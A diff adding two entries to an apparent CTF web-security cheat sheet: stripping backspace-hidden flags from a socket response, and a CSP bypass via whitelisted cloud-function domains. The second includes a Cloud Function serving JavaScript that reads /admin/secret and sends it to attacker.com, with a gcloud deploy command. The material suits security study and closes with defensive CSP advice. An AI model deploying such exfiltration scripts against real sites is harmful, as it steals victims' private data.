@@ -33,6 +33,8 @@
 - [Hyperscript CDN CSP Bypass (UNbreakable 2026)](#hyperscript-cdn-csp-bypass-unbreakable-2026)
 - [PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)](#pbkdf2-prefix-timing-oracle-via-postmessage-unbreakable-2026)
 - [Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)](#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)
+- [Terminal Control Character Obfuscation (SECCON 2015)](#terminal-control-character-obfuscation-seccon-2015)
+- [CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)](#csp-bypass-via-cloud-function-whitelisted-domain-bsidessf-2025)
 
 ---
 
@@ -573,3 +575,47 @@ var forgedUrl = "/load?p=index.php&s=" + calcSHA1("index.php" + "Ace in the Hole
 ```
 
 **Key insight:** Client-side HMAC/signature schemes leak the secret by definition — the signing key must be present in the JavaScript. Deobfuscate the JS, extract the secret, then forge signatures for any parameter value. Check for global functions like `calcSHA1`, `hmac`, `sign` in the browser console.
+
+---
+
+## Terminal Control Character Obfuscation (SECCON 2015)
+
+Server responses may hide data using ASCII backspace (0x08) characters. The terminal renders `S\x08 ` as a space (overwrites 'S'), making the flag invisible in normal display. Extract by reading raw bytes:
+
+```python
+import socket
+s = socket.socket()
+s.connect((host, port))
+data = s.recv(4096)
+flag = data.replace(b'\x08', b'').replace(b' ', b'')
+# Or: filter only printable chars that aren't followed by backspace
+```
+
+---
+
+## CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)
+
+When Content-Security-Policy whitelists cloud platform domains (e.g., `*.us-central1.run.app`, `*.cloudfunctions.net`, `*.azurewebsites.net`):
+
+1. Deploy a malicious script to the whitelisted cloud platform
+2. Load it via `<script src="https://your-func-xxxxx.us-central1.run.app">` — passes CSP
+3. Exfiltrate data from the vulnerable page
+
+```python
+# Google Cloud Function that serves exfiltration JS
+def serveIt(request):
+    js = """
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', location.origin + '/admin/secret', true);
+    xhr.onload = function() {
+        fetch('https://attacker.com/log?flag=' + encodeURIComponent(xhr.responseText));
+    };
+    xhr.send(null);
+    """
+    return (js, 200, {'Content-Type': 'application/javascript',
+                       'Access-Control-Allow-Origin': '*'})
+```
+
+Deploy with `gcloud functions deploy serveIt --runtime python39 --trigger-http --allow-unauthenticated`.
+
+**Key insight:** Cloud platform domains are shared infrastructure. Whitelisting `*.run.app` or `*.cloudfunctions.net` in CSP allows any attacker-deployed function to serve scripts. Prefer `nonce-based` or `hash-based` CSP over domain whitelists for cloud-hosted applications.
